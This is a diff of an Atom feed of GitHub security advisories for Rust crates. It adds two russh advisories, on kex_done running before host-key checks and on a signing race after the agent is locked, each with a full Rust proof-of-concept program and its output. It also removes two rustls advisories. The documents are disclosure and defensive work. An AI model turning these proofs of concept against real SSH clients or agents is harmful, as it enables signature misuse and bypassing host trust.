@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/rust.rss</id>
     <title>Security Advisory for Rust crates</title>
-    <updated>2026-11-13T18:15:33.091Z</updated>
+    <updated>2026-11-14T00:00:25.964Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust"/>
     <subtitle>Security Advisory for Rust crates on GitHub</subtitle>
@@ -11,6 +11,407 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[russh] russh kex_done: Shared-secret callback runs before server host-key verification]]></title>
+        <id>https://github.com/advisories/GHSA-9264-jvgf-6w2f</id>
+        <link href="https://github.com/advisories/GHSA-9264-jvgf-6w2f"/>
+        <updated>2026-11-13T19:20:17.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A malicious SSH server whose host key is rejected can still cause russh's <code>client::Handler::kex_done()</code> callback to execute with the raw key-exchange shared secret. Applications using the callback for its documented protocol-bridging purpose may derive keys, initialize a secondary data channel, or perform another externally visible action before russh calls <code>check_server_key()</code> and rejects the server.</p>
+<h3 id="details">Details</h3>
+<p>During the initial key exchange, russh calls <code>kex_done()</code> immediately after the server proves possession of the presented host key, but before the application decides whether that key belongs to the intended server:</p>
+<pre><code class="language-rust">let shared_secret = newkeys.kex.shared_secret_bytes();
+handler
+    .kex_done(shared_secret, &amp;newkeys.names, session)
+    .await?;
+
+// Initial KEX only checks trust afterwards.
+if let Some(certificate) = server_host_certificate {
+    if !handler.check_server_key(&amp;certificate.into()).await? {
+        return Err(crate::Error::UnknownKey.into());
+    }
+} else if let Some(server_host_key) = server_host_key {
+    let check = handler.check_server_key(&amp;server_host_key.into()).await?;
+    if !check {
+        return Err(crate::Error::UnknownKey.into());
+    }
+}
+</code></pre>
+<p>This is in <code>russh/src/client/mod.rs</code> at lines 2036-2078 of commit <code>183a22e8f8f490fa09b6eb7bd044ef99d8c4414f</code>.</p>
+<p>The API documentation describes <code>check_server_key()</code> as the important trust decision that prevents man-in-the-middle attacks. It describes <code>kex_done()</code> as the callback for deriving keys for secondary encrypted channels. The feature request that introduced the callback specifically lists VPN-over-SSH, UDP data planes, file transfer, and custom enterprise transports as intended uses.</p>
+<p>Cryptographic verification of the KEX signature does not establish peer identity: an attacker operating its own SSH server can always produce a valid signature with its own host key. Identity is established only when <code>check_server_key()</code> accepts that key or certificate.</p>
+<h3 id="expected-behavior">Expected behavior</h3>
+<p>For the initial key exchange, <code>check_server_key()</code> should accept the server identity before <code>kex_done()</code> exposes the shared secret for secondary-channel initialization.</p>
+<h3 id="actual-behavior">Actual behavior</h3>
+<p><code>kex_done()</code> runs first. An untrusted server can therefore trigger application-defined secondary-channel actions even though <code>check_server_key()</code> subsequently rejects it with <code>UnknownKey</code>.</p>
+<p>The callback was introduced by commit <code>500bef1eccc1c48ac674e2a262aa7887777431eb</code> and is present from <code>v0.55.0</code> through current <code>v0.65.0</code>.</p>
+<h3 id="proof-of-concept">Proof of concept</h3>
+<p>The following self-contained Cargo project starts a local russh server with a fresh, untrusted host key. The client models the documented bridge use case by exporting the shared secret in <code>kex_done()</code>, while <code>check_server_key()</code> rejects the server. It asserts both the failed connection and the callback order.</p>
+<p>Create an empty directory and add <code>Cargo.toml</code>:</p>
+<pre><code class="language-toml">[package]
+name = "russh-kex-before-host-trust-poc"
+version = "0.1.0"
+edition = "2024"
+
+[dependencies]
+rand = { version = "0.10", features = ["thread_rng"] }
+russh = "=0.65.0"
+tokio = { version = "1", features = ["macros", "net", "rt-multi-thread"] }
+</code></pre>
+<p>Create <code>src/main.rs</code>:</p>
+<pre><code class="language-rust">use std::sync::{Arc, Mutex};
+
+use russh::keys::{Algorithm, PrivateKey, PublicKeyOrCertificate};
+use russh::{Names, client, server};
+
+#[derive(Clone)]
+struct TestServer;
+
+impl server::Handler for TestServer {
+    type Error = russh::Error;
+}
+
+#[derive(Clone)]
+struct RejectingClient {
+    events: Arc&lt;Mutex&lt;Vec&lt;&amp;'static str&gt;&gt;&gt;,
+    exported_secret: Arc&lt;Mutex&lt;Option&lt;Vec&lt;u8&gt;&gt;&gt;&gt;,
+}
+
+impl client::Handler for RejectingClient {
+    type Error = russh::Error;
+
+    async fn kex_done(
+        &amp;mut self,
+        shared_secret: Option&lt;&amp;[u8]&gt;,
+        _names: &amp;Names,
+        _session: &amp;mut client::Session,
+    ) -&gt; Result&lt;(), Self::Error&gt; {
+        self.events.lock().unwrap().push("kex_done");
+
+        // Model a bridge exporting KEX material to a secondary protocol.
+        *self.exported_secret.lock().unwrap() = shared_secret.map(ToOwned::to_owned);
+        Ok(())
+    }
+
+    async fn check_server_key(
+        &amp;mut self,
+        _server_public_key: &amp;PublicKeyOrCertificate,
+    ) -&gt; Result&lt;bool, Self::Error&gt; {
+        self.events.lock().unwrap().push("check_server_key");
+        Ok(false)
+    }
+}
+
+#[tokio::main]
+async fn main() {
+    let mut server_config = server::Config::default();
+    server_config.inactivity_timeout = None;
+    server_config
+        .keys
+        .push(PrivateKey::random(&amp;mut rand::rng(), Algorithm::Ed25519).unwrap());
+    let server_config = Arc::new(server_config);
+
+    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+    let address = listener.local_addr().unwrap();
+    tokio::spawn(async move {
+        let (stream, _) = listener.accept().await.unwrap();
+        let _ = server::run_stream(server_config, stream, TestServer).await;
+    });
+
+    let events = Arc::new(Mutex::new(Vec::new()));
+    let exported_secret = Arc::new(Mutex::new(None));
+    let client = RejectingClient {
+        events: events.clone(),
+        exported_secret: exported_secret.clone(),
+    };
+
+    let result = client::connect(
+        Arc::new(client::Config::default()),
+        address,
+        client,
+    )
+    .await;
+
+    println!("connection accepted: {}", result.is_ok());
+    println!("callback order: {:?}", events.lock().unwrap());
+    println!(
+        "secret exported before rejection: {}",
+        exported_secret.lock().unwrap().is_some()
+    );
+
+    assert!(matches!(result, Err(russh::Error::UnknownKey)));
+    assert_eq!(
+        events.lock().unwrap().as_slice(),
+        &amp;["kex_done", "check_server_key"]
+    );
+    assert!(exported_secret.lock().unwrap().is_some());
+}
+</code></pre>
+<p>Run:</p>
+<pre><code class="language-sh">cargo run --quiet
+</code></pre>
+<p>Observed with russh <code>v0.65.0</code>:</p>
+<pre><code class="language-text">connection accepted: false
+callback order: ["kex_done", "check_server_key"]
+secret exported before rejection: true
+</code></pre>
+<p>The connection fails with <code>russh::Error::UnknownKey</code>, but the security-sensitive callback and its modeled external side effect have already occurred.</p>
+<h3 id="impact">Impact</h3>
+<p>Applications overriding <code>kex_done()</code> to bootstrap a secondary encrypted transport are affected. An unauthenticated attacker who can impersonate the SSH endpoint can complete KEX with an attacker-owned host key and trigger secondary channel initialization before that key is rejected. Depending on the bridge, this can expose early secondary-channel data or make the application act on a session established with an untrusted peer.</p>
+<p>Ordinary clients that leave <code>kex_done()</code> at its no-op default, or implementations that independently defer all callback-derived actions until host trust has been confirmed, are not affected.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Eugeny/russh/security/advisories/GHSA-9264-jvgf-6w2f">https://github.com/Eugeny/russh/security/advisories/GHSA-9264-jvgf-6w2f</a></li>
+<li><a href="https://github.com/Eugeny/russh/pull/808">https://github.com/Eugeny/russh/pull/808</a></li>
+<li><a href="https://github.com/Eugeny/russh/commit/43a46d67a80a7355fcd2fb25e7e00d79aec8184c">https://github.com/Eugeny/russh/commit/43a46d67a80a7355fcd2fb25e7e00d79aec8184c</a></li>
+<li><a href="https://github.com/Eugeny/russh/releases/tag/v0.65.1">https://github.com/Eugeny/russh/releases/tag/v0.65.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-9264-jvgf-6w2f">https://github.com/advisories/GHSA-9264-jvgf-6w2f</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9264-jvgf-6w2f</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-11-13T19:20:16.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[russh] russh try_sign: asynchronous confirmation can sign after agent lock]]></title>
+        <id>https://github.com/advisories/GHSA-736f-c93q-9fwx</id>
+        <link href="https://github.com/advisories/GHSA-736f-c93q-9fwx"/>
+        <updated>2026-11-13T19:10:47.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>In russh <code>0.65.0</code>, a sign request for a confirmation-constrained key can retain
+and use the private key after another connection locks the agent. <code>try_sign()</code>
+snapshots an <code>Arc&lt;PrivateKey&gt;</code> before awaiting <code>Agent::confirm()</code> and does not
+revalidate the shared lock state after the await. An agent-forwarding peer can
+therefore obtain a signature while the agent is locked and every new request is
+being rejected.</p>
+<h3 id="details">Details</h3>
+<p>The agent's lock and key stores are shared by all connections. <code>respond()</code> reads
+the lock state once, then dispatches a sign request:</p>
+<pre><code class="language-rust">let is_locked = {
+    // ... read the shared lock ...
+};
+
+// ...
+Some((&amp;13, mut r))
+    if !is_locked &amp;&amp; agentref.confirm_request(MessageType::Sign).await =&gt;
+{
+    let agent = self.agent.take().ok_or(Error::AgentFailure)?;
+    let (agent, signed) = self.try_sign(agent, &amp;mut r, writebuf).await?;
+</code></pre>
+<p>In <code>try_sign()</code>, russh clones the private key from the shared store and drops the
+store lock before awaiting the asynchronous confirmation callback:</p>
+<pre><code class="language-rust">let key = {
+    let blob = Bytes::decode(r)?;
+    let k = self.keys.0.read().or(Err(Error::AgentFailure))?;
+    if let Some((key, _, constraints)) = k.get(&amp;blob.to_vec()) {
+        if constraints.contains(&amp;Constraint::Confirm) {
+            needs_confirm = true;
+        }
+        key.clone()
+    } else {
+        return Ok((agent, false));
+    }
+};
+
+let agent = if needs_confirm {
+    let (agent, ok) = agent.confirm(key.clone()).await;
+    if !ok {
+        return Ok((agent, false));
+    }
+    agent
+} else {
+    agent
+};
+
+// No lock/key-state revalidation occurs here.
+sign_with_hash_alg(&amp;PrivateKeyWithHashAlg::new(key, hash_alg), &amp;data)?
+    .encode(writebuf)?;
+</code></pre>
+<p>While <code>confirm()</code> is pending, a second agent connection can successfully lock
+the shared agent. When confirmation later returns <code>true</code>, the original
+connection signs with its captured <code>Arc&lt;PrivateKey&gt;</code>.</p>
+<p>The affected code is in
+<a href="https://github.com/Eugeny/russh/blob/183a22e8f8f490fa09b6eb7bd044ef99d8c4414f/russh/src/keys/agent/server.rs#L128-L162"><code>russh/src/keys/agent/server.rs</code></a>
+and
+<a href="https://github.com/Eugeny/russh/blob/183a22e8f8f490fa09b6eb7bd044ef99d8c4414f/russh/src/keys/agent/server.rs#L330-L375"><code>try_sign()</code></a>.</p>
+<p>RFC 9987 section 5.7 requires a locked agent to suspend private-key signature
+operations until it is unlocked. A fresh request is correctly rejected while
+locked; only the request suspended across the await bypasses the lock.</p>
+<p>The vulnerable asynchronous call was introduced by commit <code>62db6e7</code> as the fix
+for GHSA-vp5q-ff62-jwqv. The behavior is present in released version <code>0.65.0</code>
+and current commit <code>183a22e8f8f490fa09b6eb7bd044ef99d8c4414f</code>.</p>
+<h3 id="expected-behavior">Expected behavior</h3>
+<p>After the agent reports a successful lock, no private-key signature operation
+should complete until a successful unlock.</p>
+<h3 id="actual-behavior">Actual behavior</h3>
+<p>A request that reached <code>Agent::confirm()</code> before the state transition signs
+afterward. New requests made in the same locked or expired state fail, confirming
+that the shared state transition took effect.</p>
+<h3 id="proof-of-concept">Proof of concept</h3>
+<p>The PoC is self-contained and uses in-memory duplex streams; it does not require
+an SSH server, Unix socket, or attached binary file. With a current stable Rust
+toolchain installed, create a new directory:</p>
+<pre><code class="language-sh">mkdir -p russh-agent-lock-toctou-poc/src
+cd russh-agent-lock-toctou-poc
+</code></pre>
+<p>Create <code>Cargo.toml</code>:</p>
+<pre><code class="language-toml">[package]
+name = "russh-agent-lock-toctou-poc"
+version = "0.1.0"
+edition = "2024"
+
+[dependencies]
+futures = "0.3"
+rand = { version = "0.10", features = ["thread_rng"] }
+russh = "=0.65.0"
+tokio = { version = "1", features = ["macros", "rt-multi-thread", "sync"] }
+tokio-stream = "0.1"
+</code></pre>
+<p>Create <code>src/main.rs</code>:</p>
+<pre><code class="language-rust">use std::{future::Future, sync::Arc};
+
+use russh::keys::agent::{
+    Constraint,
+    client::AgentClient,
+    server::{self, Agent},
+};
+use russh::keys::{Algorithm, PrivateKey};
+use tokio::{
+    io::DuplexStream,
+    sync::{Notify, mpsc},
+};
+use tokio_stream::wrappers::ReceiverStream;
+
+#[derive(Clone)]
+struct DelayedConfirm {
+    entered: Arc&lt;Notify&gt;,
+    release: Arc&lt;Notify&gt;,
+}
+
+impl Agent for DelayedConfirm {
+    fn confirm(
+        self,
+        _key: Arc&lt;PrivateKey&gt;,
+    ) -&gt; Box&lt;dyn Future&lt;Output = (Self, bool)&gt; + Unpin + Send&gt; {
+        Box::new(Box::pin(async move {
+            self.entered.notify_one();
+            self.release.notified().await;
+            (self, true)
+        }))
+    }
+}
+
+async fn connect(
+    sender: &amp;mpsc::Sender&lt;std::io::Result&lt;DuplexStream&gt;&gt;,
+) -&gt; AgentClient&lt;DuplexStream&gt; {
+    let (server_stream, client_stream) = tokio::io::duplex(1024 * 1024);
+    sender.send(Ok(server_stream)).await.unwrap();
+    AgentClient::connect(client_stream)
+}
+
+#[tokio::main]
+async fn main() {
+    let entered = Arc::new(Notify::new());
+    let release = Arc::new(Notify::new());
+    let agent = DelayedConfirm {
+        entered: entered.clone(),
+        release: release.clone(),
+    };
+
+    let (sender, receiver) = mpsc::channel(4);
+    tokio::spawn(async move {
+        server::serve::&lt;DuplexStream, _, _&gt;(ReceiverStream::new(receiver), agent)
+            .await
+            .unwrap();
+    });
+
+    let key = PrivateKey::random(&amp;mut rand::rng(), Algorithm::Ed25519).unwrap();
+    let public_key = key.public_key().clone();
+
+    let mut administrator = connect(&amp;sender).await;
+    administrator
+        .add_identity(&amp;key, &amp;[Constraint::Confirm])
+        .await
+        .unwrap();
+
+    let mut attacker = connect(&amp;sender).await;
+    let attacker_key = public_key.clone();
+    let pending_sign = tokio::spawn(async move {
+        attacker
+            .sign_request_signature(&amp;attacker_key, None, b"attacker-controlled request")
+            .await
+    });
+
+    entered.notified().await;
+    administrator.lock(b"lock-password").await.unwrap();
+    println!("agent locked while confirmation was pending");
+
+    // Control: a request started after the lock is rejected.
+    let mut control = connect(&amp;sender).await;
+    let control_result = control
+        .sign_request_signature(&amp;public_key, None, b"post-lock request")
+        .await;
+    println!("new post-lock request accepted: {}", control_result.is_ok());
+
+    // The original request signs after the lock has taken effect.
+    release.notify_one();
+    let pending_result = pending_sign.await.unwrap();
+    println!(
+        "pre-lock request signed after lock: {}",
+        pending_result.is_ok()
+    );
+
+    assert!(control_result.is_err());
+    assert!(pending_result.is_ok());
+}
+</code></pre>
+<p>Run:</p>
+<pre><code class="language-sh">cargo run --quiet
+</code></pre>
+<p>Observed on russh <code>0.65.0</code> with Rust <code>1.91.0</code>:</p>
+<pre><code class="language-text">agent locked while confirmation was pending
+new post-lock request accepted: false
+pre-lock request signed after lock: true
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>russh-based SSH agents that implement asynchronous confirmation are affected,
+including agents exposed to remote SSH servers through agent forwarding. A peer
+can begin a signature request while the agent is unlocked and hold it in the
+confirmation phase. If the agent is subsequently locked, approving or otherwise
+completing the stale confirmation still gives the peer a signature that the
+agent's current state rejects for every new request.</p>
+<p>This weakens emergency locking. The attacker does not recover private key
+material, and exploitation requires a sign request to be pending across the
+state transition and its confirmation callback eventually to return <code>true</code>.</p>
+<h2 id="related">Related</h2>
+<ul>
+<li><a href="https://www.rfc-editor.org/rfc/rfc9987.html#section-5.7">RFC 9987 section 5.7: Locking and Unlocking an Agent</a></li>
+<li><a href="https://github.com/advisories/GHSA-vp5q-ff62-jwqv">GHSA-vp5q-ff62-jwqv / CVE-2026-116794: missing confirmation enforcement</a></li>
+<li><a href="https://github.com/Eugeny/russh/commit/62db6e7defd6d244159da962ccccb029e785ce0f">Commit <code>62db6e7</code>: call <code>Agent::confirm</code></a></li>
+<li><a href="https://github.com/Eugeny/russh/blob/183a22e8f8f490fa09b6eb7bd044ef99d8c4414f/russh/src/keys/agent/server.rs#L128-L162">Affected <code>respond()</code> implementation at <code>v0.65.0</code></a></li>
+<li><a href="https://github.com/Eugeny/russh/blob/183a22e8f8f490fa09b6eb7bd044ef99d8c4414f/russh/src/keys/agent/server.rs#L330-L375">Affected <code>try_sign()</code> implementation at <code>v0.65.0</code></a></li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Eugeny/russh/security/advisories/GHSA-736f-c93q-9fwx">https://github.com/Eugeny/russh/security/advisories/GHSA-736f-c93q-9fwx</a></li>
+<li><a href="https://github.com/Eugeny/russh/pull/808">https://github.com/Eugeny/russh/pull/808</a></li>
+<li><a href="https://github.com/Eugeny/russh/commit/43a46d67a80a7355fcd2fb25e7e00d79aec8184c">https://github.com/Eugeny/russh/commit/43a46d67a80a7355fcd2fb25e7e00d79aec8184c</a></li>
+<li><a href="https://github.com/Eugeny/russh/releases/tag/v0.65.1">https://github.com/Eugeny/russh/releases/tag/v0.65.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-736f-c93q-9fwx">https://github.com/advisories/GHSA-736f-c93q-9fwx</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-736f-c93q-9fwx</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-11-13T19:10:46.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[russh] russh: Agent server never calls `Agent::confirm`, so keys added with the confirm constraint (`ssh-add -c`) sign without confirmation]]></title>
         <id>https://github.com/advisories/GHSA-vp5q-ff62-jwqv</id>
@@ -2456,85 +2857,5 @@ test test_cvss_9_9_dual_header_exploit_chain ... ok
         </author>
         <category label="severity" term="LOW"/>
         <published>2026-10-27T16:08:59.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[rustls] rustls: ECH rejection can expose buffered application data to authenticated outer server before `ech_required` alert]]></title>
-        <id>https://github.com/advisories/GHSA-vp88-798v-h67f</id>
-        <link href="https://github.com/advisories/GHSA-vp88-798v-h67f"/>
-        <updated>2026-10-27T16:09:02.000Z</updated>
-        <content type="html"><![CDATA[<p>In rustls 0.23.44 and 0.23.45, application data that a client buffers before the handshake completes is sent to the server even when the server rejects Encrypted Client Hello (ECH).</p>
-<p>When the server rejects ECH, the client completes the handshake with the outer ClientHello and authenticates the server against the ECH config's <code>public_name</code>. At the end of the handshake, <code>start_traffic()</code> encrypts and queues any plaintext buffered by <code>ClientConnection::writer()</code>. It does this <em>before</em> checking for <code>EchStatus::Rejected</code> and queueing the <code>ech_required</code> alert.</p>
-<p>The application then receives <code>Error::PeerIncompatible(ServerRejectedEncryptedClientHello)</code>, as expected. However, the client is still expected to call <code>write_tls()</code> to send the fatal alert, and that call also sends the encrypted application data. The server decrypts the data and only then receives the alert.</p>
-<p>The ordering bug is older than 0.23.44. Before 0.23.44, the client checked the server certificate against the inner server name rather than <code>public_name</code>, so a correctly configured server failed certificate verification first and no data was sent. 0.23.44 fixed that check, which makes the ordinary rejection path reachable.</p>
-<h1 id="impact">Impact</h1>
-<p>Plaintext meant for the inner server, the one named in the encrypted ClientHello, goes to the client-facing server identified by <code>public_name</code>. That server is properly authenticated, so this is not an attack by an unauthenticated party. However this violates <a href="https://www.rfc-editor.org/info/rfc9849">RFC 9849</a>, which says the following:</p>
-<ul>
-<li>Section 6.1.6: if the handshake and authentication succeed after ECH rejection, the client "MUST ... abort the connection with an "ech_required" alert <strong>before sending any application data to the server.</strong>"</li>
-<li>Section 6.1.7: the certificate is checked only against <code>public_name</code>, and the connection "MUST NOT" be reported as successful to the application. rustls does report failure correctly. The problem is only that data is sent before the alert.</li>
-</ul>
-<p>This affects only clients that meet all of these conditions:</p>
-<ul>
-<li>They use <code>EchMode::Enable</code>. GREASE ECH is not affected.</li>
-<li>They write application data before the handshake completes.</li>
-<li>They connect to a server that rejects their ECH config, for example because the config is stale. This is the same case where the server returns retry configs.</li>
-</ul>
-<p>The usual client response to rejection is to retry with the server's retry configs. In that case, the data has already gone to the outer server.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/rustls/rustls/security/advisories/GHSA-vp88-798v-h67f">https://github.com/rustls/rustls/security/advisories/GHSA-vp88-798v-h67f</a></li>
-<li><a href="https://github.com/rustls/rustls/pull/3300">https://github.com/rustls/rustls/pull/3300</a></li>
-<li><a href="https://github.com/rustls/rustls/pull/3354">https://github.com/rustls/rustls/pull/3354</a></li>
-<li><a href="https://github.com/rustls/rustls/commit/2bd5c0cefabb2c5fd4100383a736d59f9671b9b4">https://github.com/rustls/rustls/commit/2bd5c0cefabb2c5fd4100383a736d59f9671b9b4</a></li>
-<li><a href="https://github.com/rustls/rustls/commit/4de14a508fbfa2273203ec17d9dfdd0fbd29e8d1">https://github.com/rustls/rustls/commit/4de14a508fbfa2273203ec17d9dfdd0fbd29e8d1</a></li>
-<li><a href="https://github.com/rustls/rustls/commit/7dcbe4c1ae12185237d22e9197583329630a2014">https://github.com/rustls/rustls/commit/7dcbe4c1ae12185237d22e9197583329630a2014</a></li>
-<li><a href="https://github.com/rustls/rustls/releases/tag/v/0.23.46">https://github.com/rustls/rustls/releases/tag/v/0.23.46</a></li>
-<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0347.html">https://rustsec.org/advisories/RUSTSEC-2026-0347.html</a></li>
-<li><a href="https://github.com/advisories/GHSA-vp88-798v-h67f">https://github.com/advisories/GHSA-vp88-798v-h67f</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-vp88-798v-h67f</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-10-27T16:08:59.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[rustls] rustls: An unauthenticated ServerHello poisons the per-name key-exchange record, so later ClientHellos carry only a classical X25519 share]]></title>
-        <id>https://github.com/advisories/GHSA-w44r-93j7-qv28</id>
-        <link href="https://github.com/advisories/GHSA-w44r-93j7-qv28"/>
-        <updated>2026-10-27T16:08:57.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The client records the server-selected key-exchange group per server name when it processes the ServerHello, before the server is authenticated. A network attacker can answer one connection attempt for a target name with a ServerHello that selects X25519 and close the connection. Later ClientHellos for that name carry one X25519 share while supported_groups still lists X25519MLKEM768 first. If the server accepts that share instead of sending a HelloRetryRequest, the handshake completes with classical key exchange only and no error.</p>
-<p>An attacker that answers one connection attempt for the target name with a ServerHello selecting X25519 changes every later ClientHello of that client for that name, for as long as the entry stays in the store. No certificate or completed handshake is needed: it parses the ClientHello, sends the ServerHello, and closes.</p>
-<p>TLS 1.3 transcript binding stops an on-path attacker from editing the ClientHello of one connection. It does not stop the attacker from steering the client's prediction state beforehand, because that state is written from an unauthenticated message.</p>
-<h2 id="what-does-not-trigger-it">What does not trigger it</h2>
-<ul>
-<li>Servers that send a HelloRetryRequest. The connection stays hybrid and costs one extra round trip.</li>
-<li>A client configuration with resumption disabled: nothing is stored.</li>
-<li>A different server name: the record is per name.</li>
-</ul>
-<h2 id="impact">Impact</h2>
-<p>If the genuine server picks the group for which a share is present, instead of sending a HelloRetryRequest for its preferred hybrid group, the handshake completes with classical key exchange only, between two peers that both support the hybrid group. No error is raised. The confidentiality of recorded sessions against a future quantum adversary is lost for those connections (harvest now, decrypt later). There is no key compromise and no authentication bypass.</p>
-<p>Note that this behaviour is discussed at length in <a href="https://www.ietf.org/archive/id/draft-ietf-tls-key-share-prediction-01.html#name-security-considerations">draft-ietf-tls-key-share-prediction</a> so the actual security impact is largely down to a server policy decision.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/rustls/rustls/security/advisories/GHSA-w44r-93j7-qv28">https://github.com/rustls/rustls/security/advisories/GHSA-w44r-93j7-qv28</a></li>
-<li><a href="https://github.com/rustls/rustls/pull/3355">https://github.com/rustls/rustls/pull/3355</a></li>
-<li><a href="https://github.com/rustls/rustls/commit/8fa0dc5d517a63411ad1e528249bdf5b098ae5e4">https://github.com/rustls/rustls/commit/8fa0dc5d517a63411ad1e528249bdf5b098ae5e4</a></li>
-<li><a href="https://github.com/rustls/rustls/commit/f04804fa13341a9b1dc02b5d1dd8a746f2c4b7fb">https://github.com/rustls/rustls/commit/f04804fa13341a9b1dc02b5d1dd8a746f2c4b7fb</a></li>
-<li><a href="https://github.com/rustls/rustls/releases/tag/v/0.23.46">https://github.com/rustls/rustls/releases/tag/v/0.23.46</a></li>
-<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0349.html">https://rustsec.org/advisories/RUSTSEC-2026-0349.html</a></li>
-<li><a href="https://github.com/advisories/GHSA-w44r-93j7-qv28">https://github.com/advisories/GHSA-w44r-93j7-qv28</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-w44r-93j7-qv28</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-10-27T16:08:54.000Z</published>
     </entry>
 </feed>
